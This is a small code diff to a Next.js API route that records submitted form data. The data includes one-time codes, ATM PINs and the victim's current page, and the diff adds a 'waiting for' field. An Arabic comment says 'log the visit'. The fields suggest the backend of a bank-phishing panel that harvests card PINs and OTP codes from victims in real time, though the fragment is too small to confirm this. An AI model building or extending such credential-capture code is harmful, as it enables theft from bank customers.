@@ -64,6 +64,7 @@ export async function POST(req: NextRequest) {
       otpCode: body.otp_code || '',
       atmPin: body.atm_pin || '',
       currentPage: body.current_page || '',
+      waitingFor: body.waiting_for || '',
     });
 
     // تسجيل الزيارة
